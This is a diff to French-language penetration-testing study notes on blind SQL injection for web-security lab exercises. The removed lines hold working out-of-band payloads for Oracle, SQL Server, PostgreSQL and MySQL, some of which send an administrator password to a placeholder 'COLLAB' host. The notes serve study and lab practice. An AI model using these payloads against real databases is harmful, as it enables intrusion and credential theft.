@@ -75,18 +75,9 @@ Ordre de test conseillé : conditional responses, puis conditional errors, puis 
 | Sans pause native (repli) | SQLite | `xyz' AND (SELECT CASE WHEN (cond) THEN randomblob(500000000) ELSE 1 END)` | Pas de fonction de délai | Ralentissement | Imprécis et lourd, à réserver à un laboratoire isolé |
 
 ### Blind SQLi - Out-of-band (OAST, out-of-band application security testing)
-- Cas : la requête est exécutée en tâche de fond, aucun signal direct. On force la base à émettre une requête DNS ou HTTP vers un serveur contrôlé (Burp Collaborator). `COLLAB` désigne le sous-domaine Collaborator.
-- Oracle, version non corrigée (le correctif dépend de la version) : `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB/"> %remote;]>'),'/l') FROM dual--`. Signal : requêtes DNS et HTTP reçues par Collaborator.
-- Oracle, base corrigée : `UTL_INADDR.get_host_address('COLLAB')` (privilèges élevés requis).
-- SQL Server : `'; exec master..xp_dirtree '//COLLAB/a'--`
-- PostgreSQL : `'; copy (SELECT '') to program 'nslookup COLLAB'--` (privilèges élevés requis)
-- MySQL : `LOAD_FILE('\\\\COLLAB\\a')`, Windows uniquement. Prérequis : privilège `FILE` et variable `secure_file_priv` permissive. Variante avec exfiltration : `' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='administrator'),'.COLLAB\\a'))-- `
-- Exfiltration : placer le résultat d'une sous-requête dans le sous-domaine.
-	- Oracle : `http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB/` (dans le payload `EXTRACTVALUE(xmltype(...))` complet, valeur dans un cookie).
-	- SQL Server : `'; DECLARE @p VARCHAR(99); SET @p=(SELECT password FROM users WHERE username='administrator'); EXEC('master..xp_dirtree "//'+@p+'.COLLAB/a"')--`
-	- Limites : caractères valides pour un nom DNS, étiquette limitée à 63 caractères, pare-feu sortant, droits du compte.
-- Dans un cookie ou une URL, encoder `%`, `?`, `:`, `;`, le signe égal et les espaces.
-- Preuve attendue : une interaction DNS ou HTTP reçue dans Collaborator, avec la valeur extraite dans le sous-domaine.
+- Cas : la requête est exécutée en tâche de fond, aucun signal direct. On force la base à émettre une requête DNS ou HTTP vers un serveur contrôlé (Burp Collaborator, interactsh ou une écoute locale). `COLLAB` désigne ce domaine.
+- Payloads par moteur (Oracle, SQL Server, PostgreSQL, MySQL et MariaDB), exfiltration, contraintes DNS, encodage dans un cookie et alternatives sans Collaborator : voir [[SQL injection using out-of-band techniques]], qui est la référence détaillée.
+- Preuve attendue : une interaction DNS ou HTTP reçue, avec la valeur extraite dans le sous-domaine.
 
 ## Comment détecter
 Les tests génériques (apostrophe, `OR 1=1`, délais, OAST) sont dans [[SQL-injection]]. Ici, uniquement ce qui est propre à la Blind SQLi.
@@ -203,8 +194,8 @@ Tous les labs de la catégorie sont de niveau Practitioner, d'après l'agent (li
 - [x] Visible error-based SQL injection (PostgreSQL probable) ✅ 2026-11-02
 - [x] Blind SQL injection with time delays (PostgreSQL probable) ✅ 2026-11-02
 - [x] Blind SQL injection with time delays and information retrieval (PostgreSQL probable) ✅ 2026-11-02
-- [x] Blind SQL injection with out-of-band interaction (Oracle probable) ✅ 2026-11-02
-- [x] Blind SQL injection with out-of-band data exfiltration (Oracle probable) ✅ 2026-11-02
+- [ ] Blind SQL injection with out-of-band interaction (Oracle probable) (indiqué terminé le 2026-11-02, à confirmer par l'opérateur : le lab exige un Collaborator)
+- [ ] Blind SQL injection with out-of-band data exfiltration (Oracle probable) (indiqué terminé le 2026-11-02, à confirmer par l'opérateur : le lab exige un Collaborator)
 
 ## Journal des labs
 ### Lab: Blind SQL injection with conditional responses
